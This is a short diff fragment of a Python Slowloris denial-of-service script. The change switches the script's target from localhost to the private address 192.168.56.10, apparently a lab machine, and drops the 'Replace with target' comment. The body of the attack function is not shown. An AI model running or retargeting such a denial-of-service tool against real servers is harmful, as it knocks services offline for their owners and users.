@@ -34,4 +34,4 @@ def slowloris(target_host, target_port=80, num_sockets=50):
         time.sleep(15)
 
 if __name__ == "__main__":
-    slowloris("127.0.0.1", 80)  # Replace with target
+    slowloris("192.168.56.10", 80)  
